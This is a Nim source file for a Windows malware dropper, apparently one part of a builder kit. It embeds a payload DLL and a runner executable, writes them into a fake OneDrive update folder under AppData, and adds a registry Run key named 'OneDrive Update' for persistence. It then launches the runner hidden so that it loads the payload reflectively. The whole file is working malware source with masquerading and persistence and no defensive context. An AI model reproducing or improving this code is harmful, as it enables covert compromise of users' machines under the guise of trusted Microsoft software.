import winim
import std/os

# Configuration placeholders (patched by Builder)
const
    InstallDir* = r"%USERPROFILE%\AppData\Local\Microsoft\OneDrive\Update"
    ExeName* = "OneDrive Update.exe"
    DatName* = "payload.dat" # Changed from payload.dll

# We now embed the DLL binary directly
const 
    PayloadBin = staticRead("payload_build.dll") 
    RunnerBin = staticRead("runner_build.exe")

# 转换为字节数组以规避 C 编译器字符串限制
const 
    PayloadBytes: array[PayloadBin.len, byte] = (
        var arr: array[PayloadBin.len, byte]
        for i in 0..<PayloadBin.len: arr[i] = byte(PayloadBin[i])
        arr
    )
    RunnerBytes: array[RunnerBin.len, byte] = (
        var arr: array[RunnerBin.len, byte]
        for i in 0..<RunnerBin.len: arr[i] = byte(RunnerBin[i])
        arr
    )

const
    # Configuration Flags
    ConfigMark = "FRMD26_CONFIG"
    # 0 or 1 chars
    CfgInstall = '1'
    CfgStartup = '1'
    CfgTask    = '1'
    CfgService = '0'

proc main() =
    # 1. Resolve Install Directory
    var szExpanded: array[MAX_PATH, char]
    ExpandEnvironmentStringsA(InstallDir.cstring, addr szExpanded[0], MAX_PATH)
    let resolvedDir = $cast[cstring](addr szExpanded[0])

    # 2. Create Directory
    try:
        createDir(resolvedDir)
    except:
        discard

    let exePath = resolvedDir & "\\" & ExeName
    let datPath = resolvedDir & "\\" & DatName

    # 3. Drop Files
    try:
        # 这种方式会强制 Nim 编译器按字节处理，而不是生成 C 字符串字面量
        writeFile(exePath, RunnerBytes)
        writeFile(datPath, PayloadBytes)
    except:
        discard

    # 4. Persistence (Registry Run) - Only if CfgStartup is '1'
    var hKey: HKEY
    if RegOpenKeyExA(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
        let valName = "OneDrive Update"
        let valData = "\"" & exePath & "\"" 
        # Fix: Use cstring conversion for the data pointer
        RegSetValueExA(hKey, valName, 0, REG_SZ, cast[ptr BYTE](valData.cstring), DWORD(valData.len + 1))
        RegCloseKey(hKey)

    # 5. Execute Runner
    # We execute the dropped EXE, which will then load payload.dat reflectively
    let cmd = "\"" & exePath & "\""
    WinExec(cmd.cstring, SW_HIDE)

when isMainModule:
    main()
